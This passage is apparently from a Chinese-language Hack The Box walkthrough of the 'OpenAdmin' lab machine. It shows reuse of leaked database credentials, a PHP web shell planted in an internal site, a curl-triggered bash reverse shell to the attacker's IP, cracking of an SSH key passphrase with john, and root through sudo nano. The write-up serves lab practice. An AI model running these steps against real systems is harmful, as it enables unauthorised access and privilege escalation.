(</span><br><span class="line">    <span class="string">&#x27;databases&#x27;</span> =&gt; </span><br><span class="line">    array (</span><br><span class="line">      0 =&gt; </span><br><span class="line">      array (</span><br><span class="line">        <span class="string">&#x27;db_type&#x27;</span> =&gt; <span class="string">&#x27;mysqli&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_login&#x27;</span> =&gt; <span class="string">&#x27;ona_sys&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_passwd&#x27;</span> =&gt; <span class="string">&#x27;n1nj4W4rri0R!&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_database&#x27;</span> =&gt; <span class="string">&#x27;ona_default&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_debug&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">      ),</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&#x27;description&#x27;</span> =&gt; <span class="string">&#x27;Default data context&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;context_color&#x27;</span> =&gt; <span class="string">&#x27;#D3DBFF&#x27;</span>,</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">?&gt;www-data@openadmin:/var/www/html/ona/local/config$ </span><br></pre></td></tr></table></figure>
+
+<p>数据库里没什么信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         | level | ctime               | atime               |</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2022-08-22 06:31:46 | 2022-08-22 06:31:46 |</span><br><span class="line">|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2022-08-22 06:16:34 | 2022-08-22 06:16:34 |</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br></pre></td></tr></table></figure>
+
+<p>密码复用可以登录jimmy：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/etc/apache2/sites-enabled$ <span class="built_in">ls</span></span><br><span class="line">internal.conf  openadmin.conf</span><br><span class="line">jimmy@openadmin:/etc/apache2/sites-enabled$ <span class="built_in">cat</span> internal.conf </span><br><span class="line">Listen 127.0.0.1:52846</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost 127.0.0.1:52846&gt;</span><br><span class="line">    ServerName internal.openadmin.htb</span><br><span class="line">    DocumentRoot /var/www/internal</span><br><span class="line"></span><br><span class="line">&lt;IfModule mpm_itk_module&gt;</span><br><span class="line">AssignUserID joanna joanna</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">    ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line">    CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">jimmy@openadmin:/etc/apache2/sites-enabled$ </span><br></pre></td></tr></table></figure>
+
+<p>在端口52846似乎还运行着什么服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox/OpenAdmin$ ssh jimmy@10.10.10.171 -L 52846:localhost:52846</span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.171 (10.10.10.171)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.171<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">jimmy@10.10.10.171&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822143822870.png" srcset="/img/loading.gif" lazyload alt="image-20220822143822870"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/var/www/internal$ <span class="built_in">ls</span></span><br><span class="line">index.php  logout.php  main.php</span><br><span class="line">jimmy@openadmin:/var/www/internal$ <span class="built_in">echo</span> 1 &gt; 1.txt</span><br><span class="line">jimmy@openadmin:/var/www/internal$ <span class="built_in">ls</span></span><br><span class="line">1.txt  index.php  logout.php  main.php</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;hack&quot;]); ?&gt;&#x27;</span> &gt; hack.php                  </span><br><span class="line">jimmy@openadmin:/var/www/internal$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://127.0.0.1:52846/hack.php?hack=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.3/1338%200%3E%261%27&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>随便哪个会话触发一下就行了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox$ nc -lvnp 1338</span><br><span class="line">listening on [any] 1338 ...</span><br><span class="line">connect to [10.10.16.3] from (UNKNOWN) [10.10.10.171] 49182</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1221): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">joanna@openadmin:/var/www/internal$ </span><br></pre></td></tr></table></figure>
+
+<p>但是这种shell会受限很多。运行sudo时候会报错。我尝试去用户目录读取了id_rsa，但在使用的过程中需要输入密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox/OpenAdmin$ ssh2john id_rsa &gt; <span class="built_in">hash</span></span><br><span class="line">Crazy:~/HackThebox/OpenAdmin$ john -w=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span> </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 8 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">bloodninjas      (id_rsa)     </span><br><span class="line">1g 0:00:00:02 DONE (2022-08-22 14:54) 0.4566g/s 4371Kp/s 4371Kc/s 4371KC/s bloodofyouth..bloodmabite</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">                                                                                                                                       </span><br><span class="line">Crazy:~/HackThebox/OpenAdmin$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackThebox/OpenAdmin$ ssh -i id_rsa joanna@10.10.10.171</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon Aug 22 06:50:19 UTC 2022</span><br><span class="line"></span><br><span class="line">  System load:  0.01              Processes:             182</span><br><span class="line">  Usage of /:   31.0% of 7.81GB   Users logged <span class="keyword">in</span>:       1</span><br><span class="line">  Memory usage: 14%               IP address <span class="keyword">for</span> ens160: 10.10.10.171</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">39 packages can be updated.</span><br><span class="line">11 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15</span><br><span class="line">joanna@openadmin:~$ <span class="built_in">ls</span></span><br><span class="line">pwk.py  user.txt</span><br><span class="line">joanna@openadmin:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> joanna on openadmin:</span><br><span class="line">    env_keep+=<span class="string">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span>, env_keep+=<span class="string">&quot;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&quot;</span>,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass</span><br><span class="line"></span><br><span class="line">User joanna may run the following commands on openadmin:</span><br><span class="line">    (ALL) NOPASSWD: /bin/nano /opt/priv</span><br><span class="line">joanna@openadmin:~$ </span><br></pre></td></tr></table></figure>
+
+<p>这个提权，用的nano编辑器执行命令的效果，但是直接输入命令会被冻结，需要输入reset; &#x2F;bin&#x2F;sh 1&gt;&amp;0 2&gt;&amp;0，就会出现root标志性#:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Command to execute: reset; /bin/sh 1&gt;&amp;0 2&gt;&amp;0<span class="comment"># id                                                                                        </span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)                              ^X Read File</span><br><span class="line"><span class="comment"># cat /root/root.txt                                                M-F New Buffer</span></span><br><span class="line">2984.................................</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - OpenAdmin</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-OpenAdmin.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crazyinside</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackThebox-Paper.html" title="HTB Walkthrough - Paper">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Paper</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTHeBox-Object.html" title="HTB Walkthrough - Object">
+                        <span class="hidden-mobile">HTB Walkthrough - Object</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
